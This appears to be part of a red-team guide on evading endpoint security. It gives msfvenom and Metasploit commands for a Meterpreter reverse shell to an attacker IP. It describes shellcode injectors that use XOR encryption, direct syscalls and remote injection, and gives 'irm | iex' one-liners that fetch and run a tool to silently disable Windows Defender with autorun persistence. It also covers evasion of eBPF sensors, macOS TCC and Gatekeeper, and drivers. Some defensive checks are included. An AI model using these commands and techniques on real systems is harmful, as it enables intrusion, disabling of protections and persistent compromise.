## Practical Implementation

### Setting Up a Testing Lab

#### Kali (Attacker) Setup:

- Generate shellcode using msfvenom:
  ```bash
  msfvenom -p windows/x64/Meterpreter/reverse_tcp LHOST=192.168.242.128 LPORT=443 EXITFUNC=thread --platform windows -f raw -o reverse64-192168242128-443.bin
  ```
- Launch Meterpreter listener:
  ```bash
  msfconsole
  use exploit/multi/handler
  set payload windows/x64/Meterpreter/reverse_tcp
  set LPORT 443
  set LHOST 192.168.242.128
  run
  ```

#### Windows (Victim) Setup:

- Ensure VMs can communicate
- Keep Windows and Defender updated
- Create antivirus exclusion on test directory
- Disable "Automatic sample submission" during testing (re-enable outside testing)

### Windows Defender Bypass Tools

Available at [github.com/hackmosphere/DefenderBypass](https://github.com/hackmosphere/DefenderBypass):

- **myEncoder3.py** - Transforms binary files to hex and applies XOR encryption
- **InjectBasic.cpp** - Basic shellcode injector in C++
- **InjectCryptXOR.cpp** - Adds XOR decryption for encrypted shellcode
- **InjectSyscall-LocalProcess.cpp** - Uses direct syscalls to bypass userland hooks, removes suspicious functions from IAT
- **InjectSyscall-RemoteProcess.cpp** - Injects shellcode into remote processes

**Progressive techniques**:

1. Begin with basic shellcode execution
2. Add encryption/obfuscation
3. Implement direct syscalls to bypass monitoring
4. Move to remote process injection when needed

#### WSC API Abuse (defendnot)

A sophisticated technique that abuses the Windows Security Center (WSC) service to disable Windows Defender by registering a fake antivirus:

- **Concept**: WSC is used by legitimate antiviruses to notify Windows that another AV is present, causing Windows to automatically disable Defender
- **Implementation**: [defendnot](https://github.com/es3n1n/defendnot) directly interacts with the undocumented WSC API to register itself as an antivirus
- **Advantages**:
  - Completely disables Windows Defender rather than just evading detection
  - Uses legitimate Windows functionality (WSC service)
  - More reliable than traditional bypass methods
  - Successor to older techniques like "no-defender"

**Installation Methods**:

```powershell
# Basic installation
irm https://dnot.sh/ | iex

# With custom AV name
& ([ScriptBlock]::Create((irm https://dnot.sh/))) --name "Custom AV name"

# Silent installation (no console allocation)
& ([ScriptBlock]::Create((irm https://dnot.sh/))) --silent
```

**Command Line Options**:

- `--name` - Custom antivirus display name
- `--disable` - Disable defendnot
- `--verbose` - Verbose logging
- `--silent` - No console allocation
- `--autorun-as-user` - Create autorun task as current user
- `--disable-autorun` - Disable autorun task creation

**Technical Details**:

- WSC API is undocumented and typically requires Microsoft NDA for documentation
- Registers the fake AV directly with WSC rather than using third-party code
- Requires persistence via autorun to maintain registration after reboot
- Binaries must remain on disk for continued operation

**Limitations**:

- Requires autorun persistence (detectability concern)
- May be flagged by other security solutions monitoring WSC changes
- Effectiveness depends on target system configuration and other security layers

**Legitimate Use Cases**:

- Development environment resource optimization
- Performance testing under different security configurations
- Educational research on Windows security mechanisms
- Home lab experimentation

### Enhance Protection

- Prevent LSASS dumping by running it as a protected process light (`RunAsPPL`)
- Deeper analysis on EDR telemetry
- Heavy monitoring on common external compromise vectors
- Application Allow Listing

#### LSASS protection (RunAsPPL) defaults

- Windows 11 version 22H2 (new installs): Added LSA protection is enabled by default when the device is enterprise joined and supports HVCI; upgrades may not auto-enable.
- Windows 11 version 24H2: LSA protection defaults are broader; Microsoft notes it is enabled by default on more device categories (MSA/Entra/hybrid/local) with evaluation behavior on upgrade.
- Blue-team quick checks:
  - Verify registry: `HKLM\SYSTEM\CurrentControlSet\Control\Lsa` → `RunAsPPL`/`RunAsPPLBoot` (policy may also store a UEFI variable for lock).
  - Confirm status with eventing and `Get-ProcessMitigation -System` and hardware readiness (`Get-CimInstance Win32_DeviceGuard`).

### Firmware & Boot‑level Threats

- **UEFI Bootkits** (e.g., BlackLotus, CosmicStrand‑2024) execute during the DXE phase, disable BitLocker and HVCI before Windows loads, and can patch kernel code pages before EDR starts.
- **Secure Boot bypass CVE‑2024‑7344** abuses an un‑revoked test‑signed shim to load unsigned payloads even with Secure Boot enabled.
- **Mitigations**
  - Keep DBX revocation list current (August 2024 or later).
  - Enable Windows Defender System Guard Secure Launch and SVI.
  - Collect & review TPM PCR[7] and System Guard logs for unexpected changes.

### Linux / Container Visibility & Evasion

#### eBPF Runtime Sensors

- Tools like **Falco 0.38+** , **Cilium Tetragon** (real‑time enforcement with `kubectl tetragon observe`), and **AWS GuardDuty eBPF** hook `sys_enter` tracepoints and kprobes to emulate EDR telemetry on Kubernetes nodes.
- **Evasion**
  - Detach or overwrite the eBPF program with `bpftool prog detach`.
  - Remount `debugfs` elsewhere to hide BPF maps and programs.
  - Hide processes in sidecar containers that run outside the node‑agent's PID namespace filter.

#### PID‑Namespace & Cgroup Tricks

- **CVE‑2025‑26324** leaks host PIDs, allowing a container process to open `/proc/<hostpid>/mem` and bypass namespace‑based sensors.
- Sidecars running in the host network namespace can exfiltrate data without visibility from node‑level agents.

### Non‑Windows Endpoints (macOS, iOS, Android)

#### macOS

- Starting with macOS Sonoma (14), every Gatekeeper verdict is logged via the unified log channel `sender=syspolicyd`. Blue teams monitor these streams; red teams should clear the quarantine flag **before** first execution or ship a notarised loader.
- Direct edits to **TCC.db** grant screen‑recording, camera, or microphone entitlements without user prompts.
- Combine with notarised, ad‑hoc signed apps to bypass Gatekeeper on macOS 15.

#### Mobile

- **Android 13/14**: SIM‑swap plus deferred `appops` removes MDM profiles without factory reset.
- **iOS 17 KFD exploit** enables sideloading unsigned binaries that most Mobile Threat Defence solutions fail to scan.

### Kernel Driver Blocklists & Core Isolation (Windows 11 23H2+)

- Windows now ships a quarterly updated vulnerable‑driver blocklist; violations surface under _Device security → Core isolation_.
- **Kernel Data Protection (KDP)** marks EDR code pages read‑only—even for kernel drivers.
- **Attacker response:** use driver‑name collision (rename malicious driver to `iqvw64e.sys`) or flip _CiOptions_ from a BYOVD payload before loading unsigned code.
- Defender quick checks: `Get-ProcessMitigation -System`, `Get-CimInstance -ClassName Win32_DeviceGuard`, and `Get-WindowsDriver -Online -All | ? Name -match 'wd'`.
- Hardware‑Enforced Stack Protection (CET/Shadow Stack) is increasingly enabled (Windows 11 24H2+). Call‑stack spoofing must account for CET or will fault.
- LSASS protection (RunAsPPL) is enabled by default on recent Windows 11 new installs; credential theft attempts must consider this.

